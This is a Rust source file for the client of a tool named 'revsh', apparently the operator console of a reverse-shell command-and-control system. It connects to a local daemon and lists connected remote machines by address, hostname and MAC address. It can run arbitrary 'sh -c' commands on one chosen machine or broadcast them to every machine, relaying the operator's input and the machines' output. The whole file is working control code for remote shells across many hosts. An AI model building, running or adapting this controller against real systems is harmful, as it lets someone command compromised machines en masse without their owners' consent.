use crossterm::event::{EnableMouseCapture, KeyCode, DisableMouseCapture};
use crossterm::terminal::{enable_raw_mode, EnterAlternateScreen, disable_raw_mode, LeaveAlternateScreen};
use tokio::net::UnixStream;
use tokio::net::unix::{OwnedReadHalf, OwnedWriteHalf};
use tokio::sync::mpsc;
use tui::layout::{Constraint, self};
use tui::widgets::{Row, TableState};
use tui::{Terminal, widgets};
use tui::backend::CrosstermBackend;
use tui::style::{Color, Style};
use std::io::{ Write, BufRead };
use std::time::Duration;
use tokio::io::{ AsyncRead, AsyncWrite };
use tokio::sync::RwLock;
use clap::Parser;
use std::sync::Arc;
use tokio::sync::Mutex;

use revsh_common::*;
use revsh_server::*;

#[derive(Parser, Debug)]
struct Args {
    #[command(subcommand)]
    action: Action,
}

#[derive(clap::Subcommand, Debug)]
enum Action {
    #[command(name = "tui", alias = "tu", alias = "t")]
    Tui {

    },
    #[command(name = "list", alias = "ls", alias = "l")]
    ListClients { },
    #[command(name = "run", alias = "r")]
    RunCommand {
        #[arg(short, long)]
        detach: bool,
        #[arg(short, long)]
        client_only: bool,
        target: UID,
        command: String,
    },
    #[command(name = "broadcast", alias = "b")]
    RunBroadcast {
        #[arg(short, long)]
        detach: bool,
        #[arg(short, long)]
        client_only: bool,
        command: String,
    },
}

async fn tui(
    mut rcv_chan: &mut mpsc::Receiver<OutCliMessage>,
    mut snd_chan: &mut mpsc::Sender<InCliMessage>,
) {
    // TUI INIT
    enable_raw_mode().unwrap();
    let mut stdout = std::io::stdout();
    crossterm::execute!(stdout, EnterAlternateScreen, EnableMouseCapture).unwrap();
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend).unwrap();

    // Fetch users
    let mut users = list_users(&mut rcv_chan, &mut snd_chan).await.unwrap();
    users.sort_by_key(|users| users.uid);

    loop {
        let mut table_state = TableState::default();
        terminal.draw(|f| {
            let rects = layout::Layout::default()
                .constraints([Constraint::Percentage(100)].as_ref())
                .margin(0)
                .split(f.size());

            let normal_style = Style::default()
                .bg(Color::White)
                .fg(Color::Black);
            let header_cells = ["UID", "Addr", "Hostname", "Mac Address", "Connected since"]
                .iter()
                .map(|h| widgets::Cell::from(*h));

            let header = Row::new(header_cells)
                .style(normal_style)
                .height(1)
                .bottom_margin(1);

            let rows = users.iter().map(|user| {
                Row::new([
                    widgets::Cell::from(format!("{:?}", user.uid)),
                    widgets::Cell::from(format!("{:?}", user.addr)),
                    widgets::Cell::from(match &user.hostname {
                        Some(host) => format!("{}", host),
                        None => format!("None"),
                    }),
                    widgets::Cell::from(match &user.mac_address {
                        Some(mac) => format!("{}", mac),
                        None => format!("None"),
                    }),
                    widgets::Cell::from(format!("{}s",
                        (chrono::Utc::now() - user.connected_at).num_seconds()
                    )),
                ]).height(1).bottom_margin(0)
            }).collect::<Vec<_>>();
            let max_id = users.iter().map(|a| a.uid).max().unwrap_or(0);
            let id_length = format!("{max_id}").len();
            let longest_addr = users.iter()
                .map(|a| format!("{:?}", a.addr).len()).max().unwrap_or(0);
            let longest_hostname  = users.iter()
                .map(|a| match &a.hostname {
                    Some(mac) => format!("{}", mac).len(),
                    None => "None".len(),
                }).max().unwrap_or(0);
            let longest_mac  = users.iter()
                .map(|a| match a.mac_address {
                    Some(mac) => format!("{}", mac).len(),
                    None => "None".len(),
                }).max().unwrap_or(0);
            let age_length = users.iter()
                .map(|a| format!("{}s", (chrono::Utc::now() - a.connected_at).num_seconds()).len()).max().unwrap_or(0);
            let age_length = age_length.max("Connected since".len());
            
            let widths = [
                Constraint::Length(id_length as _),
                Constraint::Length(longest_addr as _),
                Constraint::Length(longest_hostname as _),
                Constraint::Length(longest_mac as _),
                Constraint::Length(age_length as _),
            ];
            let t = widgets::Table::new(rows)
                .header(header)
                .block(widgets::Block::default().borders(widgets::Borders::ALL).title("Table"))
                // .highlight_style(selected_style)
                // .highlight_symbol(">> ")
                .widths(&widths);
            f.render_stateful_widget(t, rects[0], &mut table_state);
        }).unwrap();

        while let Ok(r) = rcv_chan.try_recv() {
            match r {
                OutCliMessage::ClientConnected { info } => {
                    users.push(info);
                }
                OutCliMessage::ClientDisonnected { uid } => {
                    users = users.into_iter().filter(
                        |i| i.uid != uid
                    ).collect();
                }
                _ => ()
            }
        }

        if !crossterm::event::poll(Duration::from_millis(250)).unwrap() {
            continue
        }

        match crossterm::event::read().unwrap() {
            crossterm::event::Event::Key(key) => match key.code {
                KeyCode::Char('q') => break,
                KeyCode::Esc => break,
                _ => (),
            }
            _ => (),
        }
    }

    disable_raw_mode().unwrap();
    crossterm::execute!(
        terminal.backend_mut(),
        LeaveAlternateScreen,
        DisableMouseCapture
    ).unwrap();
    terminal.show_cursor().unwrap();
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    let (mut snd_chan, mut rcv_chan) = {
        println!("Connecting to deamon...");
        let stream = UnixStream::connect("/tmp/revsh/ipc").await
            .expect("Deamon not running");
        println!("Connected to deamon");

        let (read, write) = stream.into_split();

        (create_send_channel(write), create_recv_channel(read))
    };

    match args.action {
        Action::Tui { } => {
            tui(&mut rcv_chan, &mut snd_chan).await;
        }
        Action::ListClients { } => {
            let mut users = list_users(&mut rcv_chan, &mut snd_chan).await.unwrap();
            users.sort_by_key(|users| users.uid);

            let max_id = users.iter().map(|a| a.uid).max().unwrap_or(0);
            let longest_addr = users.iter()
                .map(|a| format!("{:?}", a.addr).len()).max().unwrap_or(0);
            let longest_hostname  = users.iter()
                .map(|a| match &a.hostname {
                    Some(mac) => format!("{}", mac).len(),
                    None => "None".len(),
                }).max().unwrap_or(0);
            let longest_mac  = users.iter()
                .map(|a| match a.mac_address {
                    Some(mac) => format!("{}", mac).len(),
                    None => "None".len(),
                }).max().unwrap_or(0);
            let age_length = users.iter()
                .map(|a| format!("{}", (chrono::Utc::now() - a.connected_at).num_seconds()).len()).max().unwrap_or(0);
            let id_length = format!("{max_id}").len();

            println!("--{}---{}---{}---{}---{}---", "-".repeat(id_length), "-".repeat(longest_addr), "-".repeat(age_length), "-".repeat(longest_hostname), "-".repeat(longest_mac));
            for user in users {
                println!(
                    "| {id:0id_length$} | {hostname:host_length$} | {mac:mac_length$} | {addr:?} | {age:0age_length$}s |",
                    id = user.uid,
                    id_length = id_length,
                    hostname = user.hostname.map(|a| format!("{}", a)).unwrap_or(format!("None")),
                    host_length = longest_hostname,
                    mac = user.mac_address.map(|a| format!("{}", a)).unwrap_or(format!("None")),
                    mac_length = longest_mac,
                    addr = user.addr,
                    age = (chrono::Utc::now() - user.connected_at).num_seconds(),
                    age_length = age_length
                );
            }
            println!("--{}---{}---{}---{}---{}---", "-".repeat(id_length), "-".repeat(longest_addr), "-".repeat(age_length), "-".repeat(longest_hostname), "-".repeat(longest_mac));
        },
        Action::RunCommand { target, command, detach, client_only } => {
            pass_command_to(
                rcv_chan, snd_chan,
                detach, client_only,
                vec![target], "sh".into(), vec!["-c".into(), command]
            ).await.unwrap();
            std::process::exit(0);
        },
        Action::RunBroadcast { command, detach, client_only } => {
            let users = list_users(&mut rcv_chan, &mut snd_chan).await.unwrap();
            let ids = users.into_iter().map(|i| i.uid).collect::<Vec<_>>();
            pass_command_to(
                rcv_chan, snd_chan,
                detach, client_only,
                ids, "sh".into(), vec!["-c".into(), command]
            ).await.unwrap();
            std::process::exit(0);
        }
    }
  
    Ok(())
}

async fn list_users(
    read: &mut mpsc::Receiver<OutCliMessage>,
    write: &mut mpsc::Sender<InCliMessage>,
) -> std::io::Result<Vec<OutCliUserInfo>> {
    write.send(InCliMessage::ListClients {
        page_size: 0,
        page_index: 1000
    }).await.unwrap();
    
    let users = loop {
        let e: OutCliMessage = read.recv().await.unwrap();
        match e {
            OutCliMessage::ClientList { users } => break users,
            _ => (),
        }
    };
    
    Ok(users)
}

async fn pass_command_to(
    mut rcv_chan: mpsc::Receiver<OutCliMessage>,
    snd_chan: mpsc::Sender<InCliMessage>,
    detach  : bool, client_only: bool,
    targets : Vec<UID>, exe: String, args: Vec<String>
) -> std::io::Result<()> {
    let created_id = new_uid();
    for &target in &targets {
        snd_chan.send(InCliMessage::SendMessageTo {
            target,
            message: S2CMessage::Execute {
                pid: created_id,
                exe: exe.clone(), args: args.clone(),
                print_output: true,
                client_only,
            },
        }).await.unwrap();
    }

    // Waiting for server's feedback
    loop {
        let e: OutCliMessage = rcv_chan.recv().await.unwrap();
        match e {
            OutCliMessage::SendToFeeback(Ok(())) => {
                break;
            },
            OutCliMessage::SendToFeeback(Err(e)) => {
                println!("Execution failed: {e}");
                return Ok(());
            },
            _ => (),
        }
    }

    if detach { return Ok(()) };
    
    let remaining_targets = Arc::new(RwLock::new(targets));

    tokio::spawn({
        let remaining_targets = Arc::clone(&remaining_targets);
        let snd_chan = snd_chan.clone();
        async move {
            loop {
                let line = tokio::task::block_in_place(|| {
                    let mut stdin = std::io::stdin().lock();
                    let mut str = String::new();
                    stdin.read_line(&mut str).unwrap();
                    str
                });
                let data = line.into_bytes().into_boxed_slice();
                for &target in &*remaining_targets.read().await {
                    snd_chan.send(InCliMessage::SendMessageTo {
                        target,
                        message: S2CMessage::Input {
                            target_pid: created_id,
                            data: data.clone(),
                        },
                    }).await.unwrap();
                };
                
                if false { break } // Avoids warning of unreachable code
            }
            
            Ok::<(), anyhow::Error>(())
        }
    });
    
    let (exit_now_send, mut exit_now_recv) = 
        tokio::sync::mpsc::channel::<()>(1);

    'msg_loop: loop {
        let e: OutCliMessage = tokio::select! {
            a = rcv_chan.recv() => a.unwrap(),
            _ = exit_now_recv.recv() => {
                break 'msg_loop 1;
            }
        };
        let ts = remaining_targets.read().await;
        match e {
            OutCliMessage::ClientMessage {
                sender,
                message: C2SMessage::ProcessOutput { pid, data }
            } if ts.contains(&sender) && pid == created_id => {
                let mut a = std::io::stdout().lock();
                a.write_all(&data).unwrap();
                a.flush().unwrap();
            },
            OutCliMessage::ClientMessage {
                sender,
                message: C2SMessage::ProcessStopped { pid, exit_code }
            } if pid == created_id => {
                let Some(target_index) = (0..ts.len())
                    .find(|&i| ts[i] == sender) else { continue };

                drop(ts);
                let mut ts = remaining_targets.write().await;
                ts.remove(target_index);

                println!("Client {sender} finished executing ({} remaining)", ts.len());
                if ts.len() == 0 {
                    println!("All target clients finished");
                    break 'msg_loop exit_code;
                }
            },
            OutCliMessage::ClientDisonnected { uid } => {
                let Some(target_index) = (0..ts.len())
                    .find(|&i| ts[i] == uid) else { continue };
                
                drop(ts);
                let mut ts = remaining_targets.write().await;
                ts.remove(target_index);

                println!("Client {uid} disonnected ({} remaining)", ts.len());
                if ts.len() == 0 {
                    println!("All target clients disconnected");
                    break 'msg_loop 1;
                }
            }
            _ => (),
        }
    };
    
    for &target in &*remaining_targets.read().await {
        snd_chan.send(InCliMessage::SendMessageTo {
            target,
            message: S2CMessage::KillProcess { pid: created_id },
        }).await.unwrap();
    }
    
    Ok(())
}
